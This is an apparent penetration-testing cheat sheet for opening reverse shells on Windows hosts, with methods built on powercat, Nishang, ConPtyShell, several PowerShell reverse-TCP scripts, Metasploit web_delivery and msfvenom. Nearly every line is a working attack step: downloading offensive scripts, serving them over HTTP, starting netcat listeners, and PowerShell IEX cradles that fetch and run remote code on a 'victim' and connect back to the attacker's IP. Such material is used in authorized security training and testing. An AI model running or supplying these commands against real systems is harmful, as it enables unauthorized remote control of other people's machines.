
######### Reverse Shell ######### 

Windows Reverse Shell
----------------------

Powercat 
=========

Kali:

wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

python -m SimpleHTTPServer 80

nc -vlp 4444

Win Victim: (Run on CMD)

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.42.129/powercat.ps1');powercat -c 192.168.42.129 -p 4444 -e cmd"

Invoke-PowercatShellTcp (Nishang)
=================================

Kali:

wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

python -m SimpleHTTPServer 80

nc -vlp 4444

Win Victim: (Run on CMD)

powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.42.129/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.42.129 -Port 4444

ConptyShell
===========

Kali:

wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

python -m SimpleHTTPServer 80

stty raw -echo; (stty size; cat) | nc -lvnp 4444

Win Victim: (Run on CMD)

powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.42.129/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.42.129 4444

mini-reverse.ps1
================

Kali:

wget https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1

cat mini-reverse.ps1 
nano mini-reverse.ps1	(Edit IP/Port for reverse connection)

python -m SimpleHTTPServer 80

nc -vlp 4444

Win Victim: (Run on CMD)

powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.42.129/mini-reverse.ps1')

PowerShell Reverse TCP 
=======================

Kali:

wget https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/original/powershell_reverse_tcp.ps1

cat powershell_reverse_tcp.ps1 
nano powershell_reverse_tcp.ps1	(Edit IP/Port for reverse connection)

python -m SimpleHTTPServer 80

nc -vlp 4444

Win Victim: (Run on CMD)

powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.42.129/powershell_reverse_tcp.ps1')

Web_Delivery
=============

Kali: using meterpreter payload

msfconsole

use exploit/multi/script/web delivery
show targets 
set target 2 (PSH)
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 4444
exploit

copy the payload and run on Victim CMD

Win Victim: (Run on CMD) copy the payload and run on Victim CMD

Kali:

sessions 1
sysinfo

MSFVenom
---------

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

python -m SimpleHTTPServer 80

nc -lvp 4444

Victim: browse - 192.168.1.2:8080




